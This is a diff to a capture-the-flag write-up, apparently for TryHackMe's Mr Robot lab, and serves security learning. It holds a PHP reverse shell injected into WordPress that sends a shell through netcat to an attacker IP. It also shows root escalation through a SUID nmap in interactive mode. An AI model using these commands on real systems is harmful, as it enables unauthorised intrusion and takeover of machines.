@@ -316,7 +316,7 @@ First we need a listener running on our attacker machine
 #### Inject reverse netcat code into WordPress
 
 ```php
-<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4444 >/tmp/f");
+<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4444 >/tmp/f");?>
 ```
 After navigating to `/0` to fire the shell execution, we get shell.
 ```shell
@@ -492,3 +492,42 @@ robot@linux:~$ cat key-2-of-3.txt
 
 We can also use `ssh -t`.
 
+### Using THM's `nmap` clue we search for nmap
+
+And we find `nmap` on the system. But notably, it has `root` privilege.
+
+`nmap` can be used to spawn an _interactive shell system_, [check out GTFObins](https://gtfobins.github.io/gtfobins/nmap/).
+
+```shell
+daemon@linux:/usr/local/bin$ ./nmap 
+
+Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2020-09-18 21:43 UTC
+Failed to resolve given hostname/IP: interactive.  Note that you can't use '/mask' AND '[1-4,7,100-]' style IP ranges
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap finished: 0 IP addresses (0 hosts up) scanned in 0.183 seconds
+
+daemon@linux:/usr/local/bin$ ls -lah
+ls -lah
+total 504K
+drwxr-xr-x  2 root root 4.0K Nov 13  2015 .
+drwxr-xr-x 10 root root 4.0K Jun 24  2015 ..
+-rwsr-xr-x  1 root root 493K Nov 13  2015 nmap
+
+daemon@linux:/usr/local/bin$ ./nmap --interactive
+./nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+# whoami
+whoami
+root
+# ls /root     
+ls /root
+firstboot_done key-3-of-3.txt
+whoami
+root
+# cat /root/key-3-of-3.txt
+cat /root/key-3-of-3.txt     
+```
